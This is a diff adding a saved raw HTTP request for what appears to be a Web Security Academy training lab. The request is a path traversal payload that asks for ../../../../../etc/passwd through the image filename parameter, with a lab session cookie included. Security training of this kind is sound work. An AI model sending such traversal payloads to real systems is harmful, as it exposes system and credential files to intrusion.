@@ -1,0 +1,14 @@
+GET /image?filename=../../../../../etc/passwd HTTP/2
+Host: 0a2000320361e39a802767f7008b008e.web-security-academy.net
+Cookie: session=BCDB8ZNHKhRFJGOI29W0PsEPXuh7ZDK3
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a2000320361e39a802767f7008b008e.web-security-academy.net/
+Sec-Fetch-Dest: image
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+
